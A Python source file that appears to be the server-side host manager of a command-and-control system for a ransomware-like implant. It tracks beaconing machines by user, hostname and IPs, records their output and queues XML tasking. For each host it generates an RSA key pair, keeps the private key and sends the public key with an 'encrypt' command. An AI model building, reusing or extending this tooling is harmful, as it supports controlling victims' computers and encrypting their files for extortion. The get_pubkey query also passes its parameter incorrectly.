from Crypto.PublicKey import RSA
from base64 import b64encode
import sqlite3
import os


class HostManager:
    def __init__(self, database):
        self.db = database
        self.column_names = [
            "lastseen",
            "username",
            "hostname",
            "internalip",
            "externalip",
            "nextaction",
            "lastoutput",
            "privkey",
        ]

        self.init_db()

    def execute_query(self, query, params=()):
        conn = sqlite3.connect(self.db)
        curs = conn.cursor()
        curs.execute(query, params)
        result = curs.fetchall()
        conn.commit()
        conn.close()

        return result

    def init_db(self):
        if not os.path.exists(self.db):
            self.execute_query(
                """
                CREATE TABLE hosts (
                        {} text,
                        {} text,
                        {} text,
                        {} text,
                        {} text,
                        {} text,
                        {} text,
                        {} text
                    )
                """.format(
                    *self.column_names
                )
            )

    def host_exists(self, host_id=None, username=None, hostname=None):
        if host_id:
            result = self.execute_query("SELECT * FROM hosts WHERE rowid=?", (host_id,))
        else:
            result = self.execute_query(
                "SELECT * FROM hosts WHERE username=? AND hostname=?",
                (username, hostname),
            )

        if result != []:
            return (True, result[0][5])
        else:
            return (False, None)

    def add_host(self, lastseen, username, hostname, internalip, externalip):
        privkey = RSA.generate(2048).exportKey("PEM").decode("utf-8")

        self.execute_query(
            "INSERT INTO hosts VALUES(?, ?, ?, ?, ?, ?, ?, ?)",
            (lastseen, username, hostname, internalip, externalip, "", "", privkey),
        )

    def update_host(self, lastseen, username, hostname):
        self.execute_query(
            "UPDATE hosts SET nextaction=?, lastseen=? WHERE username=? AND hostname=?",
            ("", lastseen, username, hostname),
        )

    def set_response(self, username, hostname, output):
        output = output[0] if output else ""

        self.execute_query(
            "UPDATE hosts SET lastoutput=? WHERE username=? AND hostname=?",
            (output, username, hostname),
        )

    def get_all_hosts(self):
        hosts = self.execute_query("SELECT rowid, * FROM hosts")

        if hosts == []:
            return {"error": "no hosts found"}

        return {
            host[0]: {
                column_name: value
                for column_name, value in zip(self.column_names, host[1:])
            }
            for host in hosts
        }

    def get_host(self, host_id):
        host = self.execute_query(
            "SELECT rowid, * FROM hosts WHERE rowid=?", (host_id,)
        )

        if host == []:
            return {"error": "no such host"}

        return {
            column_name: value
            for column_name, value in zip(self.column_names, host[0][1:])
        }

    def get_attribute(self, host_id, attribute):
        if attribute not in self.column_names:
            return None

        value = self.execute_query(
            "SELECT {} FROM hosts WHERE rowid=?".format(attribute), (host_id,)
        )

        if value == []:
            return None

        return value[0][0]

    def get_pubkey(self, host_id):
        key_pem = self.execute_query(
            "SELECT privkey FROM hosts WHERE rowid=?", (host_id)
        )[0][0]

        privkey = RSA.importKey(key_pem)
        pubkey = privkey.publickey()

        return pubkey

    def set_action(self, host_id, name, param=None):
        template = (
            "<BeaconResponse>"
            "<Command>"
            "<name>{}</name>"
            "<param>{}</param>"
            "</Command>"
            "</BeaconResponse>"
        )

        exists, _ = self.host_exists(host_id=host_id)

        if not exists:
            return False

        if name == "encrypt":
            param = b64encode(self.get_pubkey(host_id).exportKey("DER")).decode()
        elif name == "sleep" and not param.isdigit():
            return False

        action = template.format(name, param)

        res = self.execute_query(
            "UPDATE hosts SET nextaction=? WHERE rowid=?", (action, host_id)
        )

        return True
